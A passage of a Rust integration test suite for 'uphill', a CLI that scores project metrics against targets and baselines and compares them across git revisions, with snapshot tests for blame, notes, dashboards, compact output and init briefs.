    // The next 5 runs write zc's memory as 6 to 10 MB, which is not a change.
    let again = uphill_in(project.path(), &["--require-baseline"], &[]);
    assert_eq!(again.status.code(), Some(0), "{}", stdout(&again));
    assert!(stdout(&again).contains("\nNo changes since the baseline\n"));
}

#[test]
fn require_targets_fails_on_each_missed_target_and_failed_script() {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("uphill.yaml"),
        "quality:\n  run: sh metrics.sh\n  size: { target: 2kB }\n  rate: { target: 2000, better: higher }\n  ok: {}\n",
    )
    .unwrap();
    let script = dir.path().join("metrics.sh");

    // A value equal to its target meets it, in either direction.
    fs::write(
        &script,
        "printf 'size 2kB\\nrate 2000\\nok pass\\n' >> \"$UPHILL_METRICS\"\n",
    )
    .unwrap();
    let met = uphill_in(dir.path(), &["--require-targets"], &[]);
    assert_eq!(met.status.code(), Some(0), "{}", stdout(&met));
    assert!(!stdout(&met).contains("Missed targets"));

    fs::write(
        &script,
        "printf 'size 2.1kB\\nrate 1999\\nok pass\\n' >> \"$UPHILL_METRICS\"\n",
    )
    .unwrap();
    let past = uphill_in(dir.path(), &["--require-targets"], &[]);
    assert_eq!(past.status.code(), Some(1));
    assert!(stdout(&past).ends_with(
        "
Missed targets
  quality  size  2.1 kB  target 2 kB
  quality  rate  1999    target 2000

2 targets missed
"
    ));

    // A list misses at the item its roll-up selects, each failing check item is a miss, and each
    // miss shows its note.
    let scored = fixture("scored");
    let output = uphill_in(scored.path(), &["--require-targets"], &[]);
    assert_eq!(output.status.code(), Some(1));
    assert!(stdout(&output).ends_with(
        "
Missed targets
  footprint  bundle                     27.5 kB  target 5 kB  includes all of lodash
  footprint  export-size viem/op-stack  9 kB     target 5 kB
  footprint  links about.html           fail                  links to /team, which is gone
  speed      render parse               5 ms     target 2 ms

4 targets missed
"
    ));

    let failing = fixture("failing");
    let output = uphill_in(failing.path(), &["--require-targets"], &[]);
    assert_eq!(output.status.code(), Some(1));
    assert!(stdout(&output).ends_with(
        "
Missed targets
  build  script exited with status 3
  crash  script was stopped by signal 9

2 targets missed
"
    ));
}

#[test]
fn compare_reports_what_changed_since_a_revision_and_leaves_timing_noise_out() {
    let project = repository("compare");
    let dir = project.path();
    // This checkout is prepared by hand, and `setup` prepares the revision's checkout.
    fs::write(dir.join(".ready"), "").unwrap();

    let (output, unchanged) = compare_head(dir, &[]);
    assert_eq!(output.status.code(), Some(0), "{unchanged}");
    insta::assert_snapshot!(unchanged, @"
    Comparing with HEAD (abc1234)

    ●  92  footprint
      ●  92  bundle  27.5 kB  target 30 kB

    ●  99  speed  median of 8 rounds
      ●  98  encode  2 ms   target 3 ms
      ● 100  parse   10 ms  target 30 ms

    No baseline yet. Run `uphill --update` to record these values as the baseline.

    No changes against HEAD (abc1234)
      2 timings within noise

    Wrote .uphill/report.json, .uphill/report.md, .uphill/report.html
    ");

    // A larger bundle, a slower encode in every pair, and a parse time that is slower in only
    // 5 of 8 pairs. The script that measures speed changes too.
    fs::write(dir.join("bundle.txt"), "30kB\n").unwrap();
    fs::write(dir.join("encode.txt"), "2.5ms\n").unwrap();
    fs::write(dir.join("parse.txt"), "20\n20\n20\n20\n20\n5\n5\n5\n").unwrap();
    let speed = fs::read_to_string(dir.join("speed.sh")).unwrap();
    fs::write(dir.join("speed.sh"), speed + "# Changed.\n").unwrap();

    let (output, changed) = compare_head(dir, &[]);
    assert_eq!(output.status.code(), Some(0), "{changed}");
    insta::assert_snapshot!(changed, @"
    Comparing with HEAD (abc1234)
    warning: speed.sh differs in HEAD (abc1234), so its changes may come from the script

    ●  90  footprint
      ●  90  bundle  30 kB  target 30 kB

    ●  96  speed  median of 8 rounds
      ●  94  encode  2.5 ms  target 3 ms
      ●  98  parse   20 ms   target 30 ms

    No baseline yet. Run `uphill --update` to record these values as the baseline.

    Against HEAD (abc1234)
      worse  footprint  bundle  27.5 kB → 30 kB
      worse  speed      encode  2 ms → 2.5 ms (+25%)  8 of 8 pairs
      1 timing within noise

    Wrote .uphill/report.json, .uphill/report.md, .uphill/report.html
    ");

    let markdown = masked(
        dir,
        &fs::read_to_string(dir.join(".uphill/report.md")).unwrap(),
    );
    let start = markdown.find("## Changes against").unwrap();
    let end = markdown.find("## Footprint").unwrap();
    insta::assert_snapshot!(markdown[start..end], @"
    ## Changes against HEAD (abc1234)

    | Change | Category | Metric | Before | After | Pairs |
    | --- | --- | --- | --- | --- | --- |
    | worse | Footprint | Bundle | 27.5 kB | 30 kB |  |
    | worse | Speed | Encode | 2 ms | 2.5 ms (+25%) | 8 of 8 pairs |

    1 timing within noise.
    ");

    let json = masked(
        dir,
        &fs::read_to_string(dir.join(".uphill/report.json")).unwrap(),
    );
    let start = json.find("\"comparison\"").unwrap();
    insta::assert_snapshot!(json[start..], @r#"
    "comparison": {
        "reference": "HEAD (abc1234)",
        "scores": [
          {
            "category": "footprint",
            "subject": null,
            "score": 92,
            "error": null
          },
          {
            "category": "speed",
            "subject": null,
            "score": 99,
            "error": null
          }
        ],
        "changes": [
          {
            "category": "footprint",
            "subject": null,
            "metric": "bundle",
            "item": null,
            "change": "worse",
            "before": 27500,
            "after": 30000
          }
        ],
        "timings": [
          {
            "category": "speed",
            "subject": null,
            "metric": "encode",
            "item": null,
            "change": "worse",
            "before": 2000000,
            "after": 2500000,
            "pairs": 8,
            "agree": 8
          },
          {
            "category": "speed",
            "subject": null,
            "metric": "parse",
            "item": null,
            "change": "within noise",
            "before": 10000000,
            "after": 20000000,
            "pairs": 8,
            "agree": 5
          }
        ]
      }
    }
    "#);

    // Only the repository's own checkout remains.
    assert_eq!(git(dir, &["worktree", "list"]).lines().count(), 1);
}

#[test]
fn compare_uses_the_revision_baselines_and_always_removes_its_checkout() {
    let project = repository("compare");
    let dir = project.path();
    fs::write(dir.join(".ready"), "").unwrap();
    let config = fs::read_to_string(dir.join("uphill.yaml")).unwrap();

    // Without baselines the revision is measured, and a script that fails there leaves its
    // category out of the comparison.
    let footprint = fs::read_to_string(dir.join("footprint.sh")).unwrap();
    fs::write(dir.join("footprint.sh"), "exit 3\n").unwrap();
    commit(dir);
    fs::write(dir.join("footprint.sh"), footprint).unwrap();
    let (output, text) = compare_head(dir, &["footprint"]);
    assert_eq!(output.status.code(), Some(0), "{text}");
    insta::assert_snapshot!(text, @"
    Comparing with HEAD (abc1234)
    warning: footprint.sh differs in HEAD (abc1234), so its changes may come from the script

    ●  92  footprint
      ●  92  bundle  27.5 kB  target 30 kB
        warning: footprint failed in HEAD (abc1234): script exited with status 3

    No baseline yet. Run `uphill --update` to record these values as the baseline.

    No changes against HEAD (abc1234)

    Wrote .uphill/report.json, .uphill/report.md, .uphill/report.html
    ");
    assert_eq!(git(dir, &["worktree", "list"]).lines().count(), 1);
    insta::assert_snapshot!(scores(dir), @r#"
    "scores": [
          {
            "category": "footprint",
            "subject": null,
            "score": null,
            "error": "script exited with status 3"
          }
        ],
    "#);
    insta::assert_snapshot!(fs::read_to_string(dir.join(".uphill/comment.md")).unwrap(), @r#"
    ## Uphill

    <table><tr><th align="left">Category</th><th>HEAD</th><th>This run</th></tr><tr><td><b>Footprint</b></td><td align="center"><img src="https://raw.githubusercontent.com/wevm/uphill/main/assets/gauges/failed.svg" width="48" height="48" alt="Footprint: failed"></td><td align="center"><img src="https://raw.githubusercontent.com/wevm/uphill/main/assets/gauges/92.svg" width="48" height="48" alt="Footprint: 92"></td></tr></table>
    "#);

    // The revision's baseline wins over measuring it, which would find the same 27.5 kB.
    fs::write(
        dir.join("uphill.yaml"),
        config.replace("{ target: 30kB }", "{ target: 30kB, baseline: 25kB }"),
    )
    .unwrap();
    commit(dir);
    let (output, text) = compare_head(dir, &["footprint"]);
    assert_eq!(output.status.code(), Some(0), "{text}");
    insta::assert_snapshot!(text, @"
    Comparing with HEAD (abc1234)

    ●  92  footprint
      ●  92  bundle  27.5 kB  target 30 kB

    Since the baseline
      worse  footprint  bundle  25 kB → 27.5 kB

    Against HEAD (abc1234)
      worse  footprint  bundle  25 kB → 27.5 kB

    Wrote .uphill/report.json, .uphill/report.md, .uphill/report.html
    ");

    // Once `--update` moves every target and the baseline into the baseline file, the revision
    // that sets them inline still measures alike, and its baseline still compares. A category
    // that did not run keeps its targets.
    let output = uphill_in(dir, &["footprint", "--update"], &[]);
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    assert_eq!(
        fs::read_to_string(dir.join("uphill.yaml")).unwrap(),
        config
            .replace("{ target: 30kB }", "{}")
            .replace("{ target: 3ms }", "{}")
            .replace("{ target: 30ms }", "{}")
    );
    insta::assert_snapshot!(fs::read_to_string(dir.join("uphill.baseline.yaml")).unwrap(), @"
    # Each measurement's `baseline`, the size, count, or check `uphill --update` accepted, and its
    # `target`. Edit a target here, and each run reports what changed since the baseline.

    footprint:
      bundle: { baseline: 27.5kB, target: 30kB }

    speed:
      encode: { target: 3ms }
      parse: { target: 30ms }
    ");
    let (output, text) = compare_head(dir, &["footprint"]);
    assert_eq!(output.status.code(), Some(0), "{text}");
    insta::assert_snapshot!(text, @"
    Comparing with HEAD (abc1234)

    ●  92  footprint
      ●  92  bundle  27.5 kB  target 30 kB

    No changes since the baseline

    Against HEAD (abc1234)
      worse  footprint  bundle  25 kB → 27.5 kB

    Wrote .uphill/report.json, .uphill/report.md, .uphill/report.html
    ");

    // The revision's scores come from running it, even when its baseline file records its values.
    fs::write(dir.join("bundle.txt"), "20kB\n").unwrap();
    commit(dir);
    fs::write(dir.join("bundle.txt"), "27.5kB\n").unwrap();
    let (output, text) = compare_head(dir, &["footprint"]);
    assert_eq!(output.status.code(), Some(0), "{text}");
    insta::assert_snapshot!(scores(dir), @r#"
    "scores": [
          {
            "category": "footprint",
            "subject": null,
            "score": 98,
            "error": null
          }
        ],
    "#);
    // `comment.md` shows both revisions' gauges, with the compared revision's name.
    insta::assert_snapshot!(fs::read_to_string(dir.join(".uphill/comment.md")).unwrap(), @r#"
    ## Uphill

    <table><tr><th align="left">Category</th><th>HEAD</th><th>This run</th></tr><tr><td><b>Footprint</b></td><td align="center"><img src="https://raw.githubusercontent.com/wevm/uphill/main/assets/gauges/98.svg" width="48" height="48" alt="Footprint: 98"></td><td align="center"><img src="https://raw.githubusercontent.com/wevm/uphill/main/assets/gauges/92.svg" width="48" height="48" alt="Footprint: 92"></td></tr></table>
    "#);

    // A failed setup stops the run before any script.
    fs::write(
        dir.join("uphill.yaml"),
        config.replace(
            "setup: touch .ready",
            "setup: echo 'no network' >&2; exit 4",
        ),
    )
    .unwrap();
    let (output, _) = compare_head(dir, &[]);
    assert_eq!(output.status.code(), Some(2));
    insta::assert_snapshot!(masked(dir, &stderr(&output)), @"
    error: setup in HEAD (abc1234) exited with status 4
    no network
    ");
    assert_eq!(git(dir, &["worktree", "list"]).lines().count(), 1);

    let output = uphill_in(dir, &["--compare", "no-such-branch"], &[]);
    assert_eq!(output.status.code(), Some(2));
    insta::assert_snapshot!(stderr(&output), @"error: unknown revision 'no-such-branch'");
}

#[test]
fn blame_bisects_commits_until_baselines_record_the_metric_and_log_lists_them() {
    let project = repository("compare");
    let dir = project.path();
    // Three more commits: one moves the bundle, one slows encode, and one changes nothing.
    let mut day = 2;
    let mut commit_as = |dir: &Path, title: &str| {
        git(dir, &["add", "-A"]);
        let date = format!("2026-01-0{day}T12:00:00");
        git(dir, &["commit", "-q", "-m", title, "--date", &date]);
        day += 1;
    };
    fs::write(dir.join("bundle.txt"), "30kB\n").unwrap();
    commit_as(dir, "feat: inline the icons");
    fs::write(dir.join("encode.txt"), "2.5ms\n").unwrap();
    commit_as(dir, "refactor: encode in one pass");
    fs::write(dir.join("README.md"), "Docs.\n").unwrap();
    commit_as(dir, "docs: add a readme");

    // Names each commit by its position, oldest first, so snapshots do not depend on hashes.
    let named = |text: &str| {
        let log = git(dir, &["log", "--reverse", "--format=%h"]);
        log.lines()
            .enumerate()
            .fold(text.to_owned(), |text, (index, hash)| {
                text.replace(hash, &format!("commit{}", index + 1))
            })
    };

    let output = uphill_in(dir, &["blame", "footprint", "bundle"], &[]);
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    insta::assert_snapshot!(named(&stdout(&output)), @"
    Bisecting footprint bundle across 4 commits, measuring each in a temporary checkout
      HEAD     30 kB
      commit1  27.5 kB
      commit2  30 kB  same as HEAD

    commit2 moved footprint bundle from 27.5 kB to 30 kB
      2026-01-02  feat: inline the icons
    ");

    let output = uphill_in(dir, &["blame", "speed", "encode"], &[]);
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    insta::assert_snapshot!(named(&stdout(&output)), @"
    Bisecting speed encode across 4 commits, measuring each in a temporary checkout
      HEAD     2.5 ms
      commit1  2 ms
      commit2  2 ms
      commit3  2.5 ms  same as HEAD

    commit3 moved speed encode from 2 ms to 2.5 ms
      2026-01-03  refactor: encode in one pass
    ");

    // Parse writes the same times at every commit, so nothing moved it.
    let output = uphill_in(dir, &["blame", "speed", "parse"], &[]);
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    insta::assert_snapshot!(named(&stdout(&output)), @"
    Bisecting speed parse across 4 commits, measuring each in a temporary checkout
      HEAD     10 ms
      commit1  10 ms  same as HEAD

    Nothing moved speed parse since commit1: it measures 10 ms there too
    ");
    assert_eq!(git(dir, &["worktree", "list"]).lines().count(), 1);

    let output = uphill_in(dir, &["log", "footprint", "bundle"], &[]);
    insta::assert_snapshot!(stdout(&output), @"No baseline or note records footprint bundle. `uphill --note` keeps each run, and `uphill blame` measures commits");

    // Once baselines record the bundle, its history comes from them.
    fs::write(dir.join(".ready"), "").unwrap();
    uphill_in(dir, &["footprint", "--update"], &[]);
    commit_as(dir, "chore: record baselines");
    fs::write(dir.join("bundle.txt"), "28kB\n").unwrap();
    uphill_in(dir, &["footprint", "--update"], &[]);
    commit_as(dir, "perf: subset the font");

    let output = uphill_in(dir, &["log", "footprint", "bundle"], &[]);
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    insta::assert_snapshot!(named(&stdout(&output)), @"
    footprint bundle in the baselines of uphill.baseline.yaml

      commit6  2026-01-06  28 kB  from 30 kB  perf: subset the font
      commit5  2026-01-05  30 kB              chore: record baselines
    ");

    let output = uphill_in(dir, &["blame", "footprint", "bundle"], &[]);
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    insta::assert_snapshot!(named(&stdout(&output)), @"
    commit6 moved footprint bundle from 30 kB to 28 kB, by the baselines in uphill.baseline.yaml
      2026-01-06  perf: subset the font
    ");

    // After the speed script moves, older commits still run the command their configuration
    // declares.
    fs::create_dir(dir.join("scripts")).unwrap();
    fs::rename(dir.join("speed.sh"), dir.join("scripts/speed.sh")).unwrap();
    let config = fs::read_to_string(dir.join("uphill.yaml")).unwrap();
    fs::write(
        dir.join("uphill.yaml"),
        config.replace("run: sh speed.sh", "run: sh scripts/speed.sh"),
    )
    .unwrap();
    commit_as(dir, "chore: move the scripts");
    let output = uphill_in(dir, &["blame", "speed", "encode"], &[]);
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    insta::assert_snapshot!(named(&stdout(&output)), @"
    Bisecting speed encode across 7 commits, measuring each in a temporary checkout
      HEAD     2.5 ms
      commit1  2 ms
      commit4  2.5 ms  same as HEAD
      commit2  2 ms
      commit3  2.5 ms  same as HEAD

    commit3 moved speed encode from 2 ms to 2.5 ms
      2026-01-03  refactor: encode in one pass
    ");

    let output = uphill_in(dir, &["blame", "footprint", "size"], &[]);
    assert_eq!(output.status.code(), Some(2));
    insta::assert_snapshot!(stderr(&output), @"error: unknown metric 'size'. footprint configures bundle");

    let output = uphill_in(dir, &["log", "footprint"], &[]);
    assert_eq!(output.status.code(), Some(2));
    insta::assert_snapshot!(stderr(&output).lines().next().unwrap(), @"code: VALIDATION_ERROR");
}

#[test]
fn notes_keep_runs_for_log_and_the_trends_in_report_html() {
    let project = repository("compare");
    let dir = project.path();
    fs::write(dir.join(".ready"), "").unwrap();
    // `uphill --note` commits to the notes ref with the repository's identity.
    git(dir, &["config", "user.name", "Uphill"]);
    git(dir, &["config", "user.email", "uphill@example.com"]);
    let mut day = 1;
    let mut dated = |dir: &Path, args: &[&str]| {
        let date = format!("2026-01-0{day}T12:00:00");
        git(dir, &[args, &["--date", &date]].concat());
        day += 1;
    };
    dated(
        dir,
        &[
            "commit",
            "-q",
            "--amend",
            "-m",
            "feat: measure the bundle and speed",
        ],
    );
    let named = |text: &str| {
        let log = git(dir, &["log", "--reverse", "--format=%h"]);
        log.lines()
            .enumerate()
            .fold(text.to_owned(), |text, (index, hash)| {
                text.replace(hash, &format!("commit{}", index + 1))
            })
    };

    let output = uphill_in(dir, &["--note"], &[]);
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    assert!(named(&stdout(&output)).ends_with("report.html, a note on commit1\n"));
    insta::assert_snapshot!(git(dir, &["notes", "--ref", "refs/notes/uphill", "show", "HEAD"]), @"
    [footprint 92]
    bundle 27.5kB
    [speed 99]
    encode 2ms
    parse 10ms
    ");
    // The report note holds the same bytes as report.json, for readers outside the repository.
    assert_eq!(
        git(
            dir,
            &["notes", "--ref", "refs/notes/uphill-report", "show", "HEAD"]
        ),
        fs::read_to_string(dir.join(".uphill/report.json")).unwrap()
    );

    // Encode slows in one commit and the bundle grows in the next, and each run is noted.
    fs::write(dir.join("encode.txt"), "2.5ms\n").unwrap();
    git(dir, &["add", "-A"]);
    dated(dir, &["commit", "-q", "-m", "refactor: encode in one pass"]);
    uphill_in(dir, &["--note"], &[]);
    fs::write(dir.join("bundle.txt"), "30kB\n").unwrap();
    git(dir, &["add", "-A"]);
    dated(dir, &["commit", "-q", "-m", "feat: inline the icons"]);
    uphill_in(dir, &["--note"], &[]);

    let output = uphill_in(dir, &["log", "speed", "encode"], &[]);
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    insta::assert_snapshot!(named(&stdout(&output)), @"
    speed encode in the runs noted in refs/notes/uphill

      commit3  2026-01-03  2.5 ms  feat: inline the icons
      commit2  2026-01-02  2.5 ms  refactor: encode in one pass
      commit1  2026-01-01  2 ms    feat: measure the bundle and speed
    ");
    let output = uphill_in(dir, &["log", "footprint", "bundle"], &[]);
    insta::assert_snapshot!(named(&stdout(&output)), @"
    footprint bundle in the runs noted in refs/notes/uphill

      commit3  2026-01-03  30 kB    feat: inline the icons
      commit2  2026-01-02  27.5 kB  refactor: encode in one pass
      commit1  2026-01-01  27.5 kB  feat: measure the bundle and speed
    ");

    // The report leaves out the note on HEAD, which this run stands for.
    uphill_in(dir, &[], &[]);
    let html = fs::read_to_string(dir.join(".uphill/report.html")).unwrap();
    let trends: Vec<&str> = html
        .split("<div class=\"plot\"")
        .skip(1)
        .filter_map(|plot| plot.split("aria-label=\"").nth(1)?.split('"').next())
        .collect();
    insta::assert_debug_snapshot!(trends, @r#"
    [
        "Score over the last 3 runs, from 92 to 90",
        "Bundle over the last 3 runs, from 27.5 kB to 30 kB",
        "Score over the last 3 runs, from 99 to 97",
        "Encode over the last 3 runs, from 2 ms to 2.5 ms",
        "Parse over the last 3 runs, from 10 ms to 10 ms",
    ]
    "#);

    fs::write(dir.join("bundle.txt"), "31kB\n").unwrap();
    let output = uphill_in(dir, &["--note"], &[]);
    assert_eq!(output.status.code(), Some(2));
    insta::assert_snapshot!(stderr(&output), @"error: --note needs tracked files that match HEAD, so the note describes that commit. Commit or stash the changes first");
}

#[test]
fn dashboard_reads_each_repository_from_its_report_or_compact_notes() {
    // One repository notes two runs, one notes a run before report notes existed, and one notes
    // none.
    let (noted, compact, none) = (
        repository("compare"),
        repository("compare"),
        repository("compare"),
    );
    for dir in [noted.path(), compact.path(), none.path()] {
        fs::write(dir.join(".ready"), "").unwrap();
        git(dir, &["config", "user.name", "Uphill"]);
        git(dir, &["config", "user.email", "uphill@example.com"]);
    }
    uphill_in(noted.path(), &["--note"], &[]);
    fs::write(noted.path().join("encode.txt"), "2.5ms\n").unwrap();
    commit(noted.path());
    uphill_in(noted.path(), &["--note"], &[]);
    uphill_in(compact.path(), &["--note"], &[]);
    git(
        compact.path(),
        &["update-ref", "-d", "refs/notes/uphill-report"],
    );

    let out = tempfile::tempdir().unwrap();
    let names = [noted.path(), compact.path(), none.path()].map(|dir| dir.to_str().unwrap());
    let shown = |text: &str| {
        let text = masked(compact.path(), &masked(noted.path(), text));
        let date = git(noted.path(), &["log", "-1", "--format=%ad", "--date=short"]);
        names.iter().zip(["noted", "compact", "none"]).fold(
            text.replace(date.trim(), "2026-01-01"),
            |text, (name, shown)| text.replace(name, shown),
        )
    };

    let output = uphill_in(out.path(), &[&["dashboard"][..], &names].concat(), &[]);
    assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
    insta::assert_snapshot!(shown(&stdout(&output)), @"
    noted  abc1234  2026-01-01  report note
      ●  92  footprint
      ●  97  speed

    compact  abc1234  2026-01-01  compact note
      ●  92  footprint
      ●  99  speed

    none  no noted runs

    Wrote .uphill/dashboard.html
    ");

    let html = fs::read_to_string(out.path().join(".uphill/dashboard.html")).unwrap();
    let sections: Vec<String> = html
        .split("<section class=\"block\"")
        .skip(1)
        .map(|section| {
            let trends = section.matches("<div class=\"plot\"").count();
            let source = section
                .split("<p class=\"muted\">")
                .nth(1)
                .unwrap_or_default();
            let source = source.split("</p>").next().unwrap_or_default();
            format!("{trends} trends, {}", shown(source))
        })
        .collect();
    insta::assert_snapshot!(sections.join("\n"), @"
    2 trends, Newest noted run: <code>abc1234</code> on 2026-01-01, change. From its report note.
    0 trends, Newest noted run: <code>abc1234</code> on 2026-01-01, change. From its compact note, which has no targets or metric scores.
    ");
    // The report note's targets, which the compact note does not hold.
    assert!(
        html.contains(
            "<td>Encode</td><td class=\"value\">2.5 ms</td><td class=\"value\">3 ms</td>"
        )
    );
    assert!(shown(&html).contains("<p class=\"muted\">No noted runs: none.</p>"));

    let output = uphill_in(out.path(), &["dashboard", "missing"], &[]);
    assert_eq!(output.status.code(), Some(2));
    assert!(stderr(&output).starts_with("error: could not fetch missing: "));
}

#[test]
fn compact_prints_scores_misses_and_opportunities_in_a_few_lines() {
    let project = fixture("scored");

    // Each miss shows once, with its note, even when --require-targets fails the run.
    let output = uphill_in(project.path(), &["--compact", "--require-targets"], &[]);

    assert_eq!(output.status.code(), Some(1));
    insta::assert_snapshot!(stdout(&output), @"
    footprint 42, speed 75

    Missed targets
      footprint  bundle                     27.5 kB  target 5 kB  includes all of lodash
      footprint  export-size viem/op-stack  9 kB     target 5 kB
      footprint  links about.html           fail                  links to /team, which is gone
      speed      render parse               5 ms     target 2 ms

    Opportunities
      +29  footprint  bundle                     27.5 kB → 5 kB
      +19  speed      render parse               5 ms → 2 ms
      +11  footprint  links about.html           fail → pass
      +3   footprint  export-size viem/chains    10 kB → 5 kB
      +3   footprint  export-size viem/op-stack  9 kB → 5 kB

    No baseline yet. Run `uphill --update` to record these values as the baseline.

    Wrote .uphill/report.json, .uphill/report.md, .uphill/report.html

    4 targets missed
    ");

    // When no single item moves the score enough, the failing items of a list are one
    // opportunity, and they go from fail to pass.
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("uphill.yaml"),
        "quality:\n  run: sh metrics.sh\n  ok: {}\n",
    )
    .unwrap();
    fs::write(
        dir.path().join("metrics.sh"),
        "i=0\nwhile [ $i -lt 250 ]; do\n  if [ $i -lt 150 ]; then r=pass; else r=fail; fi\n  echo \"ok item$i $r\" >> \"$UPHILL_METRICS\"\n  i=$((i + 1))\ndone\n",
    )
    .unwrap();
    let output = uphill_in(dir.path(), &["--compact"], &[]);
    let opportunities = stdout(&output)
        .split("Opportunities\n")
        .nth(1)
        .and_then(|rest| rest.split("\n\n").next())
        .map(str::to_owned);
    insta::assert_debug_snapshot!(opportunities, @r#"
    Some(
        "  +40  quality  ok, 100 items  fail → pass",
    )
    "#);
}

#[test]
fn init_points_the_brief_at_the_closest_example() {
    let brief = |files: &[(&str, &str)]| {
        let dir = tempfile::tempdir().unwrap();
        for (path, contents) in files {
            let path = dir.path().join(path);
            fs::create_dir_all(path.parent().unwrap()).unwrap();
            fs::write(path, contents).unwrap();
        }
        let output = uphill_in(dir.path(), &["init"], &[]);
        assert_eq!(output.status.code(), Some(0));
        let text = stdout(&output);
        text.lines()
            .find(|line| line.contains("example"))
            .unwrap()
            .to_owned()
    };

    insta::assert_snapshot!(brief(&[("Cargo.toml", "[package]\n")]), @"The closest example is a Rust API: https://github.com/wevm/uphill/tree/main/examples/rust-api. Read its `.agents/uphill/uphill.yaml` and `.agents/uphill/metrics/` before writing anything. `uphill add wevm/uphill/packs/rust@main` adds the `rust` pack of conventions, pinned to a commit.");
    insta::assert_snapshot!(brief(&[("package.json", r#"{ "devDependencies": { "vite": "7.0.0" } }"#)]), @"The closest example is a website: https://github.com/wevm/uphill/tree/main/examples/web-app. Read its `.agents/uphill/uphill.yaml` and `.agents/uphill/metrics/` before writing anything. `uphill add wevm/uphill/packs/web@main` adds the `web` pack of conventions, pinned to a commit.");
    insta::assert_snapshot!(brief(&[("package.json", "{}"), ("pages/index.html", "")]), @"The closest example is a website: https://github.com/wevm/uphill/tree/main/examples/web-app. Read its `.agents/uphill/uphill.yaml` and `.agents/uphill/metrics/` before writing anything. `uphill add wevm/uphill/packs/web@main` adds the `web` pack of conventions, pinned to a commit.");
    insta::assert_snapshot!(brief(&[("package.json", r#"{ "name": "lib" }"#)]), @"The closest example is a TypeScript library: https://github.com/wevm/uphill/tree/main/examples/typescript-library. Read its `.agents/uphill/uphill.yaml` and `.agents/uphill/metrics/` before writing anything. `uphill add wevm/uphill/packs/typescript@main` adds the `typescript` pack of conventions, pinned to a commit.");
    insta::assert_snapshot!(brief(&[("README.md", "")]), @"Read the closest example before writing anything: a TypeScript library (https://github.com/wevm/uphill/tree/main/examples/typescript-library), a website (https://github.com/wevm/uphill/tree/main/examples/web-app), or a Rust API (https://github.com/wevm/uphill/tree/main/examples/rust-api).");
    insta::assert_snapshot!(brief(&[("package.json", "{}"), (".agents/uphill.yaml", "a:\n  run: \"true\"\n  b: {}\n")]), @"The closest example is a TypeScript library: https://github.com/wevm/uphill/tree/main/examples/typescript-library. Read its `.agents/uphill/uphill.yaml` and `.agents/uphill/metrics/` before writing anything. `uphill add wevm/uphill/packs/typescript@main` adds the `typescript` pack of conventions, pinned to a commit. This project already has `.agents/uphill.yaml`. Extend it instead of starting over.");
}

#[test]
fn init_ends_the_brief_with_the_uphill_skill() {
    let dir = tempfile::tempdir().unwrap();

    let output = uphill_in(dir.path(), &["init"], &[]);
    assert_eq!(output.status.code(), Some(0));

    // Headings outside code blocks, where `#` starts a comment. The skill's frontmatter is left
    // out, so the brief keeps one title per part.
    let text = stdout(&output);
    let mut fenced = false;
    let headings: Vec<&str> = text
        .lines()
        .filter(|line| {
            if line.starts_with("```") {
                fenced = !fenced;
            }
            !fenced && line.starts_with('#')
        })
        .collect();
    insta::assert_debug_snapshot!(headings, @r###"
    [
        "# Set up Uphill in this project",
        "## Steps",
        "## Configuration",
        "## Metric lines",
        "# Uphill",
        "## Process",
        "## Ambitious Targets",
        "## Depth and Detail",
        "## Tools First",
        "## Packs",
        "## Patterns",
        "## Mistakes",
    ]
    "###);
}

/// A Git host for packs: repositories under its `remote/` directory, which Git reaches through
/// `https://github.com/` by a URL rewrite in its own global configuration.
struct Host {
    cache: PathBuf,
    config: PathBuf,
    dir: TempDir,
}

impl Host {
    /// Creates the host and its repository `acme/packs`, which holds the fixture pack `pack` at
    /// `sizes/` in one commit from 2026-01-01.
    fn new() -> Self {
        let dir = tempfile::tempdir().unwrap();
        let config = dir.path().join("gitconfig");
        fs::write(
            &config,
            format!(
                "[url \"file://{}/remote/\"]\n\tinsteadOf = https://github.com/\n",
                dir.path().display()
            ),
        )
        .unwrap();

        let host = Self {
            cache: dir.path().join("cache"),
            config,
            dir,
        };
        let repository = host.repository();
        fs::create_dir_all(repository.join("sizes")).unwrap();
        git(&repository, &["init", "-q", "-b", "main"]);
        git(&repository, &["config", "uploadpack.allowFilter", "true"]);
        copy(
            &Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/pack"),
            &repository.join("sizes"),
        );
        host.commit("2026-01-01T00:00:00Z");
        host
    }

    /// Returns the path of the repository `acme/packs`.
    fn repository(&self) -> std::path::PathBuf {
        self.dir.path().join("remote/acme/packs.git")
    }

    /// Commits every change in the repository with `date` as its author and committer date, and
    /// returns the commit.
    fn commit(&self, date: &str) -> String {
        let repository = self.repository();
        git(&repository, &["add", "-A"]);
        let output = Command::new("git")
            .args([
                "-c",
                "user.name=Uphill",
                "-c",
                "user.email=uphill@example.com",
            ])
            .args(["commit", "-q", "-m", "change"])
            .env("GIT_AUTHOR_DATE", date)
            .env("GIT_COMMITTER_DATE", date)
            .current_dir(&repository)
            .output()
            .unwrap();
        assert!(output.status.success(), "{}", stderr(&output));
        git(&repository, &["rev-parse", "HEAD"]).trim().to_owned()
    }

    /// Returns the cache of fetched packs that [`Self::envs`] names.
    fn cache(&self) -> &Path {
        &self.cache
    }

    /// Returns the directory of the pack at `sizes/` in `commit` in the cache.
    fn cached(&self, commit: &str) -> PathBuf {
        self.cache().join("uphill/packs").join(commit).join("sizes")
    }

    /// Returns the environment that points Git at the host and caches packs in [`Self::cache`].
    fn envs(&self) -> [(&str, &Path); 3] {
        [
            ("GIT_CONFIG_GLOBAL", self.config.as_path()),
            ("GIT_CONFIG_NOSYSTEM", Path::new("1")),
            ("XDG_CACHE_HOME", self.cache.as_path()),
        ]
    }
}

/// Creates a project that runs one category of its own.
fn packed_project() -> TempDir {
    let dir = tempfile::tempdir().unwrap();
    fs::write(
        dir.path().join("uphill.yaml"),
